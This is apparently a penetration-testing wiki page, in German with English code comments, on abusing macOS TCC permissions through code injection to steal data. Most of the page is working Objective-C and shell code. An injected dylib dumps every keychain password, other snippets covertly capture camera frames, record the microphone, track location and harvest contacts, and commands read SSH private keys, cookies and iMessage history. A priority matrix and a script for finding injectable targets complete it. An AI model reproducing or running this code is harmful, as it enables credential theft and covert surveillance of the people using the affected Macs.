# Anmeldedaten- und Datendiebstahl über TCC-Berechtigungen

{{#include ../../../../banners/hacktricks-training.md}}

## Übersicht

macOS TCC (Transparency, Consent, and Control) schützt den Zugriff auf sensible Benutzerdaten. Wenn ein Angreifer **ein Binary kompromittiert, das bereits TCC-Berechtigungen erhalten hat**, übernimmt er diese Berechtigungen. Diese Seite dokumentiert das Ausnutzungspotenzial jeder TCC-Berechtigung im Zusammenhang mit Datendiebstahl.<sup>[[2]](#references)</sup>

> [!WARNING]
> Code injection in ein Binary mit TCC-Berechtigungen (über DYLD injection, dylib hijacking oder task port) **übernimmt stillschweigend alle TCC-Berechtigungen**. Es gibt keine zusätzliche Abfrage oder Verifizierung, wenn derselbe Prozess auf geschützte Daten zugreift.<sup>[[4]](#references)</sup>

---

## Keychain Access Groups

### Der Gewinn

Der macOS Keychain speichert:
- **Wi-Fi-Passwörter** — alle gespeicherten Zugangsdaten für drahtlose Netzwerke
- **Website-Passwörter** — Safari-, Chrome- (bei Verwendung des Keychain) und andere Browser-Passwörter
- **Anwendungspasswörter** — E-Mail-Konten, VPN-Zugangsdaten, Development-Tokens
- **Zertifikate und private Schlüssel** — Code Signing, Client-TLS, S/MIME-Verschlüsselung
- **Sichere Notizen** — vom Benutzer gespeicherte Secrets

### Entitlement: `keychain-access-groups`

Keychain-Elemente sind in **Access Groups** organisiert. Das `keychain-access-groups`-Entitlement einer Anwendung legt fest, auf welche Gruppen sie zugreifen kann:<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Kamerazugriff (kTCCServiceCamera)

### Ausnutzung

Eine Binärdatei mit einer TCC-Berechtigung für die Kamera (über `kTCCServiceCamera` oder das Entitlement `com.apple.security.device.camera`) kann Fotos und Videos aufnehmen:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Ab **macOS Sonoma** ist die Kameraanzeige in der Menüleiste dauerhaft sichtbar und kann programmgesteuert nicht ausgeblendet werden. Unter **älteren macOS-Versionen** erzeugt eine kurze Aufnahme möglicherweise keine erkennbare Anzeige.

---

## Mikrofonzugriff (kTCCServiceMicrophone)

### Exploitation

Der Mikrofonzugriff erfasst sämtliche Audiodaten vom integrierten Mikrofon, Headset oder angeschlossenen Audioeingabegeräten:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Angriff: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Standortverfolgung (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Kontinuierliches Tracking
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Kontakte / Kalender / Fotos

### Exfiltration persönlicher Daten

| TCC Service | Framework | Daten |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Namen, E-Mail-Adressen, Telefonnummern, Adressen |
| `kTCCServiceCalendar` | `EventKit` | Besprechungen, Teilnehmer, Orte |
| `kTCCServicePhotos` | `Photos.framework` | Fotos, Screenshots, Standortmetadaten |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Kontakte-Erfassung
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud-Account-Zugriff

### Entitlement: `com.apple.private.icloud-account-access`

Dieses Entitlement ermöglicht die Kommunikation mit dem XPC-Service `com.apple.iCloudHelper` und gewährt Zugriff auf:
- **iCloud tokens** — Authentifizierungstoken für die Apple ID des Benutzers
- **iCloud Drive** — synchronisierte Dokumente von allen Geräten
- **iCloud Keychain** — auf allen Apple-Geräten synchronisierte Passwörter
- **Find My** — Standort aller Apple-Geräte des Benutzers<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Das Kompromittieren eines mit iCloud-Berechtigungen ausgestatteten Binaries erweitert den Angriff von **einem einzelnen Gerät auf das gesamte Apple-Ökosystem**: weitere Macs, iPhones, iPads und die Apple Watch. Die Synchronisierung des iCloud Keychain bedeutet, dass Passwörter von allen Geräten zugänglich sind.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### Die mächtigste TCC-Berechtigung

Full Disk Access gewährt Lesemöglichkeiten für **jede Datei auf dem System**, einschließlich:
- Daten anderer Apps (Messages, Mail, Safari-Verlauf)
- TCC-Datenbanken (die alle anderen Berechtigungen offenlegen)
- SSH-Schlüssel und -Konfiguration
- Browser-Cookies und Session-Tokens
- Anwendungsdatenbanken und Caches
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation-Prioritätsmatrix

Bei der Bewertung injizierbarer TCC-berechtigter Binaries sollte nach dem Datenwert priorisiert werden:

| Priorität | TCC-Berechtigung | Warum |
|---|---|---|
| **Kritisch** | Full Disk Access | Zugriff auf alles |
| **Kritisch** | TCC Manager | Kann jede Berechtigung gewähren |
| **Hoch** | Keychain Access Groups | Alle gespeicherten Passwörter |
| **Hoch** | iCloud Account Access | Kompromittierung mehrerer Geräte |
| **Hoch** | Input Monitoring (ListenEvent) | Keylogging |
| **Hoch** | Accessibility | GUI-Steuerung, Selbstgewährung |
| **Mittel** | Screen Capture | Erfassung visueller Daten |
| **Mittel** | Camera + Microphone | Überwachung |
| **Mittel** | Contacts + Calendar | Daten für Social Engineering |
| **Niedrig** | Location | Physische Ortung |
| **Niedrig** | Photos | Persönliche Daten |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## References

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — "Was auf deinem Mac passiert, bleibt in Apples iCloud?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — TCC-Exploitation](https://objective-see.org/blog/blog_0x4C.html)
{{#include ../../../../banners/hacktricks-training.md}}
